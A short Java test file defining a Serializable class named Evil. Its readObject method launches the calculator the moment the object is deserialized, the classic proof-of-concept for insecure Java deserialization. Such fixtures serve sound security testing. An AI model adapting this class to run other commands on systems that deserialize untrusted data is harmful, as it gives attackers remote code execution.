package test;

import java.io.*;

public class Evil implements Serializable{

    private void readObject(java.io.ObjectInputStream stream) throws Exception{
        stream.defaultReadObject();
        Runtime.getRuntime().exec("calc");
    }
}